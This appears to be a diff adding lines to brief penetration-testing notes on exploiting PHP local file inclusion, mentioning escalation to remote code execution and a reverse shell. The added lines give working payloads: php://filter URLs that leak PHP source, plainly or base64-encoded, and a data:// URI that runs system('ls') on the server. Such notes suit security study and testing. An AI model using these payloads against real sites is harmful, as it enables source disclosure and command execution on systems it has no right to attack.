@@ -12,3 +12,13 @@ we can add php rce in it and try to load file
 after this we can try to retrieve reverse shell by running the command by passing the reverse shell command in cmd params.
 
 
+Note: if you want to read php executable file content we can also use php wrappers like php://filter
+
+example reading admin.php
+`/index.php?page=php://filter/resource=admin.php` will print plain text
+`/index.php?page=php://filter/convert.base64-encode/resource=admin.txt` will give base64 of page content
+
+
+we can use data:// to execute
+example:
+`/page=data://text/plain,<?php%20echo%20system('ls');?>` will execute ls
